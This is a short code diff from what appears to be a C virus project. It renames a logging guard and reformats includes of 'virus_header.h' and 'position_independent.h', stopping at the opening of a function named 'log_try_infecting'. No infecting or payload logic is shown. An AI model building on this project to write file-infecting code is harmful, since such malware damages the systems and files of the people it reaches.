@@ -1,9 +1,9 @@
 
-#ifdef DEBUG
+#ifdef LOGS
 
-#include "virus_header.h"
-#include "utils.h"
-#include "position_independent.h"
+# include "virus_header.h"
+# include "utils.h"
+# include "position_independent.h"
 
 void	log_try_infecting(const char *file)
 {
